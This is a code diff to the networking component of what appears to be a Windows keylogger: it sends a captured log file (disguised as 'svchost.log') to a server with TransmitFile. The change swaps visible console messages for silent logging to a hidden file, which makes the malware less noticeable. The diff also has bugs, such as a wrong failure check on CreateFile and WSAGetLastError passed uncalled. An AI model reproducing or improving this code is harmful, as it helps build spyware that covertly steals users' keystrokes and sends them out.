@@ -22,9 +22,20 @@
 #define DEFAULT_HOST "localhost"
 #define CHUNK_SIZE 10
 #define FILE_NAME L"svchost.log"
+#define LOG_FILE L"C:\\tmp\\swine.log"
 
 namespace SwineNetworking {
 	int Networking::keysLogged = 0;
+	void Networking::logNetworking(char *message, size_t bytes) {
+		DWORD written;
+		HANDLE hd = CreateFile(LOG_FILE, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (hd == NULL) {
+			printf("Couldn't open log file\n");
+		}
+		BOOL success = WriteFile(hd, message, bytes, &written, NULL);
+		printf("Wrote %d bytes.\n", written);
+		CloseHandle(hd);
+	}
 	BOOL Networking::checkError(BOOL error, wchar_t *message) {
 		if (error) {
 			DWORD errCode = GetLastError();
@@ -34,7 +45,6 @@ namespace SwineNetworking {
 			if (errorText != NULL) {
 				static wchar_t buffer[1024];
 				swprintf(buffer, 1023, L"ERROR: %1s: %1s", message, errorText);
-				wprintf(buffer);
 				LocalFree(errorText);
 			}
 		}
@@ -82,6 +92,7 @@ namespace SwineNetworking {
 		WSADATA wsaData;
 		SOCKET ConnectSocket = INVALID_SOCKET;
 		DWORD fileSize = GetFileSize(file, NULL);
+		char buffer[1024];
 		struct addrinfo *result = NULL, *ptr = NULL, hints;
 		char recvbuf[DEFAULT_BUFLEN];
 		int iResult;
@@ -90,7 +101,8 @@ namespace SwineNetworking {
 		// Initialize Winsock
 		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
 		if (iResult != 0) {
-			printf("WSAStartup failed with error: %d\n", iResult);
+			sprintf(buffer, "WSAStartup failed with error: %d\n", iResult);
+			Networking::logNetworking(buffer, strlen(buffer));
 			return 1;
 		}
 		
@@ -102,7 +114,8 @@ namespace SwineNetworking {
 		// Resolve the server address and port
 		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
 		if (iResult != 0) {
-			printf("getaddrinfo failed with error: %d\n", iResult);
+			sprintf(buffer, "getaddrinfo failed with error: %d\n", iResult);
+			Networking::logNetworking(buffer, strlen(buffer));
 			WSACleanup();
 			return 1;
 		}
@@ -113,7 +126,8 @@ namespace SwineNetworking {
 			// Create a SOCKET for connecting to server
 			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 			if (ConnectSocket == INVALID_SOCKET) {
-				printf("socket failed with error: %ld\n", WSAGetLastError());
+				sprintf(buffer, "socket failed with error: %ld\n", WSAGetLastError());
+				Networking::logNetworking(buffer, strlen(buffer));
 				WSACleanup();
 				return 1;
 			}
@@ -131,22 +145,23 @@ namespace SwineNetworking {
 		freeaddrinfo(result);
 
 		if (ConnectSocket == INVALID_SOCKET) {
-			printf("Unable to connect to server!\n");
+			sprintf(buffer, "Unable to connect to server!\n");
+			Networking::logNetworking(buffer, strlen(buffer));
 			WSACleanup();
 			return 1;
 		}
 
 		// Send an initial buffer
-		printf("Sending file of size: %d\n", fileSize);
+		sprintf(buffer, "Sending file of size: %d\n", fileSize);
+		Networking::logNetworking(buffer, strlen(buffer));
 		BOOL sent = TransmitFile(ConnectSocket, file, 0, 0, NULL, NULL, TF_DISCONNECT);
 		if (!sent) {
-			printf("send failed with error: %d\n", WSAGetLastError());
+			sprintf(buffer, "send failed with error: %d\n", WSAGetLastError());
+			Networking::logNetworking(buffer, strlen(buffer));
 			closesocket(ConnectSocket);
 			WSACleanup();
 			return 1;
 		}
-
-		printf("Sent File, now deleting\n");
 
 		// shutdown the connection since no more data will be sent
 		iResult = shutdown(ConnectSocket, SD_SEND);
@@ -157,20 +172,25 @@ namespace SwineNetworking {
 			return 1;
 		}
 
-		printf("Receiving Bytes.\n");
+		sprintf(buffer, "Receiving Bytes.\n");
+		Networking::logNetworking(buffer, strlen(buffer));
 		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
-		if (iResult > 0)
+		if (iResult > 0) {
 			printf("Bytes received: %d\n", iResult);
-		else if (iResult == 0)
-			printf("Connection closed\n");
-		else
-			printf("recv failed with error: %d\n", WSAGetLastError());
+		} else if (iResult == 0) {
+			sprintf(buffer, "Connection closed\n");
+			Networking::logNetworking(buffer, strlen(buffer));
+		} else {
+			sprintf(buffer, "recv failed with error: %d\n", WSAGetLastError);
+			Networking::logNetworking(buffer, strlen(buffer));
+		}
 
 		// cleanup
 		closesocket(ConnectSocket);
 		WSACleanup();
 
-		printf("Closed connection to server\n");
+		sprintf(buffer, "Closed connection to Server.\n");
+		Networking::logNetworking(buffer, strlen(buffer));
 
 		return 0;
 	}
